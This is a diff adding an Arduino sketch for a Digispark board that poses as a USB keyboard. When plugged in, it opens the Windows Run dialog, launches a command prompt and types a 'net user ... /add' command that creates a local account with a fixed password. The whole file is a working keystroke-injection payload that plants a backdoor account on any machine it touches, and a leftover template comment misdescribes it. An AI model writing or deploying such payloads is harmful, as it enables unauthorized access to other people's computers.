@@ -1,0 +1,22 @@
+#include "DigiKeyboard.h"
+
+// the setup routine runs once when you press reset:
+void setup() {                
+  // initialize the digital pin as an output.
+  delay(1000); 
+  DigiKeyboard.update(); 
+  delay(100); 
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+  delay(1000); 
+  DigiKeyboard.println("cmd"); 
+  delay(1000); 
+  DigiKeyboard.print("net user name_jorge jorge123! ");
+  DigiKeyboard.sendKeyStroke(KEY_7, MOD_SHIFT_LEFT);
+  DigiKeyboard.println("add");
+
+}
+
+// the loop routine runs over and over again forever:
+void loop() {
+
+}
